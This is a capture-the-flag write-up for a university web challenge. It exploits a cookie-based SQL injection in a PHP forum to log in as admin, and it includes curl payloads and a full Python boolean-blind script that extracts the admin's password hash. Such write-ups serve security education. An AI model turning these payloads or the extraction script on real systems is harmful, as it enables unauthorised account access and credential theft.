# High School Project
Category: Web Exploitation

## Description
> Here's my high school project, an online forum. It's so good that people actually use it. You can join, too. Since I'm the admin, I can also post secret stuff that only I can read. How cool is that!

## Solution

Visiting the attached website, we arrive to a forum with many categories and posts. The first category is called "Secrets" and is described as the "Admin's secret place".

In the "Secrets" category, there's a topic titled "Flag". However, if we try to view it, we get an error: "Only an admin can view this topic".

The forum allows users to sign up by selecting a username / password combination and entering their email. Later, they can sign in with their username and password.

Another feature that the forum has is the ability to view the implementation sources (implemented in PHP). This is available via a link at the bottom of each page: `<a href="?src">Source</a>`. It's possible to append `"?src"` to any public PHP file and view its sources (including files which are included from within other files).

We won't go over all the sources, let's just cover the logic related to signing up and logging in.

In `signup.php`, after verifying various things about the username and password, we have:

```php
        $sql = "INSERT INTO
                    users(user_name, user_pass, user_email ,user_date, user_level)
                VALUES('" . mysqli_real_escape_string($conn, $_POST['user_name']) . "',
                       '" . sha1($_POST['user_pass']) . "',
                       '" . mysqli_real_escape_string($conn, $_POST['user_email']) . "',
                        NOW(),
                        0)";

        $result = mysqli_query($conn ,$sql);
        if(!$result)
        {
            //something went wrong, display the error
            echo 'Something went wrong while registering. Please try again later.';
            echo mysqli_error($conn); //debugging purposes, uncomment when needed
        }
        else
        {
            echo 'Successfully registered. You can now <a href="signin.php">sign in</a> and start posting! :-)';
        }
```

The main point here is that the password is saved as a SHA1 hash in the database.

In `signin.php`, after performing basic checks for the username and password, the application performs the following:

```php
//the form has been posted without errors, so save it
//notice the use of mysql_real_escape_string, keep everything safe!
//also notice the sha1 function which hashes the password
$sql = "SELECT
            user_id,
            user_name,
            user_pass,
            user_level
        FROM
            users
        WHERE
            user_name = '" . mysqli_real_escape_string($conn, $_POST['user_name']) . "'
        AND
            user_pass = '" . sha1($_POST['user_pass']) . "'";

$result = mysqli_query($conn, $sql);
if(!$result)
{
    //something went wrong, display the error
    echo 'Something went wrong while signing in. Please try again later.';
    //echo mysql_error(); //debugging purposes, uncomment when needed
}
else
{
    //the query was successfully executed, there are 2 possibilities
    //1. the query returned data, the user can be signed in
    //2. the query returned an empty result set, the credentials were wrong
    if(mysqli_num_rows($result) == 0)
    {
        echo 'You have supplied a wrong user/password combination. Please try again.';
    }
    else
    {
        //we put the user_id, user_name and user_pass values in cookies, so we can use it at various pages
        while($row = mysqli_fetch_assoc($result))
        {
            setcookie('user_id', $row['user_id']);
            setcookie('user_name', $row['user_name']);
            setcookie('user_pass', $row['user_pass']);

            echo 'Welcome, ' . $row['user_name'] . '. <a href="index.php">Proceed to the forum overview</a>.';
        }
    }
}
```

It searches for a user with a matching username and password, and if found - saves the user ID, username and hash of the password to a cookie.

Later, when accessing any page, `header.php` decides if the user is logged in by comparing the cookies to the DB:

```php
    $user = null;
    if(isset($_COOKIE['user_id'], $_COOKIE['user_name'], $_COOKIE['user_pass']))
    {
    $sql = "SELECT
                user_id,
                user_name,
                user_level
            FROM
                users
            WHERE
                user_id = " . mysqli_real_escape_string($conn, $_COOKIE['user_id']) . "
            AND
                user_name = '" . mysqli_real_escape_string($conn, $_COOKIE['user_name']) . "'
            AND
                user_pass = '" . mysqli_real_escape_string($conn, $_COOKIE['user_pass']) . "'";

    $result = mysqli_query($conn, $sql);
    if($result)
    {
        //we also put the user_id and user_name values in the $user, so we can use it at various pages
        while($row = mysqli_fetch_assoc($result))
        {
            $user = array();
            $user['user_id']    = $row['user_id'];
            $user['user_name']  = $row['user_name'];
            $user['user_level'] = $row['user_level'];
        }
    }
    }

    if($user)
    {
        echo 'Hello ' . $user['user_name'] . '! Not you? <a href="signout.php">Sign out</a>';
    }
    else
    {
        echo '<a href="signin.php">Sign in</a> or <a href="signup.php">create an account</a>.';
    }
```

We can see that all DB access is sanitized using `mysqli_real_escape_string` (or `sha1`), and yet an injection is still possible! The faulty code is:

```sql
SELECT
    user_id,
    user_name,
    user_level
FROM
    users
WHERE
    user_id = " . mysqli_real_escape_string($conn, $_COOKIE['user_id']) . "
AND
    user_name = '" . mysqli_real_escape_string($conn, $_COOKIE['user_name']) . "'
AND
    user_pass = '" . mysqli_real_escape_string($conn, $_COOKIE['user_pass']) . "'";
```

Notice how the user id (which is expected to be an integer) is not surrounded by quotes. `mysqli_real_escape_string` just sanitizes `NUL (ASCII 0), \n, \r, \, ', ", Control-Z`, meaning we can enter anything else and refactor the SQL query without being detected. 

The first thing that came to mind was to comment out the rest of the query by setting the `user_id` cookie value to `"100 --"`. This should produce the following query:

```sql
SELECT user_id, user_name, user_level FROM users WHERE  user_id = 100 -- AND user_name = 'my_user' AND user_pass = 'my_pass'";
```

However, this didn't work, and other comment styles didn't affect the query either.

Another strategy would be to rewrite the query by taking advantage of MySQL's operator precedence and OR short-circuit evaluation. MySQL evaluations OR operators after finishing evaluating AND operators. So a query such as `SELECT true OR false AND false;` would return `true` since first the engine evaluates `false AND false` to `false` and then `true or false` to `true`.

In our example, this would map to setting the `user_id` cookie to `"100 or user_id = 9999"`, creating a query of:
```sql
SELECT user_id, user_name, user_level FROM users WHERE  user_id = 100 or user_id = 9999 AND user_name = 'my_user' AND user_pass = 'my_pass'";
```

Such a query should return the user entry for the user with ID `100` regardless of the password. Let's try it:

```console
root@kali:/media/sf_CTFs/technion/High_School_Project# curl 'http://ctf.cs.technion.ac.il:4010/'  -H "Cookie: user_id=100 or user_id = 9999 ; user_name=a; user_pass=a" -s | grep "Sign out"
    Hello 5845653! Not you? <a href="signout.php">Sign out</a>  </div>
```

We can see that the forum has identified us as the user with username `5845653` even without entering a password.

The next thing we'd like to do is search for the admin account:

```console
root@kali:/media/sf_CTFs/technion/High_School_Project# for i in {0..10}; do echo $i; curl 'http://ctf.cs.technion.ac.il:4010/'  -H "Cookie: user_id=$i or user_id = 99
99 ; user_name=a; user_pass=a" -s | grep "Sign out" && echo; done
0
1
2
3
4
    Hello admin! Not you? <a href="signout.php">Sign out</a>  </div>

5
6
    Hello admin1! Not you? <a href="signout.php">Sign out</a>  </div>

7
8
    Hello admin2! Not you? <a href="signout.php">Sign out</a>  </div>

9
    Hello DuckyDebugDuck! Not you? <a href="signout.php">Sign out</a>  </div>

10
    Hello hey! Not you? <a href="signout.php">Sign out</a>  </div>
```

We can see that the administrator has received user ID #4. We should now be able to visit the forum under his user and read his secrets.

```console
root@kali:/media/sf_CTFs/technion/High_School_Project# curl 'http://ctf.cs.technion.ac.il:4010/topic.php?id=1'  -H "Cookie: user_id=4 or user_id = 9999 ; user_name=a; user_pass=a" -s | head -n 35

<!doctype html>
<html>

<head>
<title>Online Forum Project DSW</title>
<link rel="stylesheet" href="style.css">
<link rel="shortcut icon" href="favicon.ico">
</head>

<body>
<h1> Online Forum</h1>
  <div id="wrapper">
  <div id="menu">
      <a class="item" href="index.php"> Home </a>
      <a class="item" href="create_topic.php"> Create a topic</a>
      <a class="item" href="create_cat.php"> Create a category</a>
    </div>

  <div id="userbar">

  <div id="userbar">
    Hello admin! Not you? <a href="signout.php">Sign out</a>  </div>
  </div>

  <div id="content">
<h2>Posts in Flag topic</h2><table border="1">
                      <tr>
                        <th>Post</th>
                        <th>Date and user name</th>
                      </tr><tr><td class="leftpart">import hashlib<br>
password = input('Insert admin password: ')<br>
x1 = hashlib.sha1(password.encode()).hexdigest()<br>
x2 = hashlib.sha1(x1.encode()).hexdigest()[:10]<br>
print('The flag is: cstechnion{A1m0$7_$3cUR3_' + x2 + '}')</td><td class="rightpart">23-11-2020<br>admin</td></tr><tr><td class="leftpart">a</td><td class="rightpart">23-11-2020<br>y</td></tr><tr><td class="leftpart">test2</td><td class="rightpart">23-11-2020<br>revivo</td></tr><tr><td class="leftpart"></td><td class="rightpart">23-11-2020<br>user</td></tr><tr><td class="leftpart">yo send me the flag :(</td><td class="rightpart">23-11-2020<br>user</td></tr><tr><td class="leftpart">WOOHOOO</td><td class="rightpart">24-11-2020<br>matan4</td></tr><tr><td class="leftpart"></td><td class="rightpart">24-11-2020<br>admin3</td></tr><tr><td class="leftpart"></td><td class="rightpart">24-11-2020<br>admin3</td></tr><tr><td class="leftpart">asdasdaxzczc</td><td class="rightpart">24-11-2020<br>asdqwezxc</td></tr><tr><td class="leftpart">asdasdaxzczc</td><td class="rightpart">24-11-2020<br>asdqwezxc</td></tr><tr><td class="leftpart"></td><td class="rightpart">24-11-2020<br>asdqwezxc</td></tr><tr><td class="leftpart">flag?</td><td class="rightpart">24-11-2020<br>asdqwezxc</td></tr><tr><td class="leftpart">flag?</td><td class="rightpart">24-11-2020<br>asdqwezxc</td></tr><tr><td class="leftpart">flag?</td><td class="rightpart">24-11-2020<br>asdqwezxc</td></tr><tr><td class="leftpart">got the flag lol YEET</td><td class="rightpart">25-11-2020<br>admin</td></tr><tr><td class="leftpart">nice flag</td><td class="rightpart">26-11-2020<br>admin</td></tr><tr><td class="leftpart">Nice Flag!</td<br> class="rightpart">26-11-2020<br>admin</td></tr><tr><td class="leftpart">According to all known laws
```

Between a lot of fake messages written by (probably) other participants which were able to login as admin, we see the following message:

```
password = input('Insert admin password: ')<br>
x1 = hashlib.sha1(password.encode()).hexdigest()<br>
x2 = hashlib.sha1(x1.encode()).hexdigest()[:10]<br>
print('The flag is: cstechnion{A1m0$7_$3cUR3_' + x2 + '}')
```

So, we need to somehow extract the admin's password. We can turn our SQL injection into a boolean-blind injection and brute-force the password (or the password's hash, to be exact) character after character. This means that for each character in the `user_pass` field, we craft a query so that the user will be logged in only if the query is true. Something like this:

```sql
SELECT user_id, user_name, user_level FROM users WHERE  user_id = 4 and /*n-th character of user_pass is x*/ or user_id = 9999 AND user_name = 'my_user' AND user_pass = 'my_pass'";
```

For each index in the `user_password` string, we can try all possible characters until we see the user being welcomed as logged in. That's when we know we found the correct character. Usually this is done by injecting a query such as `and substring(user_pass,/*index*/,1) = char(/*current_character*/)`.

This should work but will require us to iterate over all possible characters for each index (in the worst case). It's not too bad in our case since we know that the field contains a hex string, so characters are limited to `[0-9a-f]`, but just for fun we'll use a slightly different method to recover each character in a constant number of queries: We'll just extract each character by performing 7 queries to identify each bit in the character (ASCII characters always have the eighth bit zeroed).

The code:

```python
from pwn import *
import requests

BITS_IN_BYTE        = 8
PASSWORD_FIELD_LEN  = 20*2 # SHA1 hash -> 20 bytes, each byte is printed as two characters

ADMIN_USER_ID       = 4

def inject_query(query):
    cookies = {
        "user_id": query,
        "user_name": "name",
        "user_pass": "pass"
    }
    r = requests.get("http://ctf.cs.technion.ac.il:4010/", cookies=cookies)
    return 'Not you? <a href="signout.php">Sign out</a>' in r.text

def leak_user_pass_character(user_id, index):
    byte = 0
    for i in range(BITS_IN_BYTE):
        bit_mask = (1 << i)
        is_bit_set = inject_query(f"{user_id} and ord(substring(user_pass,{index+1},1))&{bit_mask}={bit_mask} or FALSE ")
        byte |= (is_bit_set << i)
    return chr(byte)
    
def leak_password(user_id):
    password = ""
    with log.progress(f'Leaking password field for user {user_id}') as p:
        for i in range(PASSWORD_FIELD_LEN):
            p.status(f"Processing index {i}, recovered '{password}' so far...")
            new_char = leak_user_pass_character(user_id, i)
            password += new_char
    return password

admin_pass = leak_password(ADMIN_USER_ID)
log.success(f"Admin password: {admin_pass}")

```

Output:
```console
root@kali:/media/sf_CTFs/technion/High_School_Project# python3 solve.py
[+] Leaking password field for user 4: Done
[+] Admin password: eef2c983660a888d1c23703ab1aef09f65d90edb
```

We can double check our result by trying to access a page using these values:

```console
root@kali:/media/sf_CTFs/technion/High_School_Project# curl 'http://ctf.cs.technion.ac.il:4010/topic.php?id=1'  -H "Cookie: user_id=4; user_name=admin; user_pass=eef2
c983660a888d1c23703ab1aef09f65d90edb" -s | grep "Sign out"
    Hello admin! Not you? <a href="signout.php">Sign out</a>  </div>
```

The last part is constructing the flag according to the instructions we got:

```python
>>> import hashlib
>>> x1 = "eef2c983660a888d1c23703ab1aef09f65d90edb"
>>> x2 = hashlib.sha1(x1.encode()).hexdigest()[:10]
>>> print('The flag is: cstechnion{A1m0$7_$3cUR3_' + x2 + '}')
The flag is: cstechnion{A1m0$7_$3cUR3_ee51f2a8c6}
```

Notice that we don't know the admin's password, but we do have the SHA1 of the password which is enough to get the flag.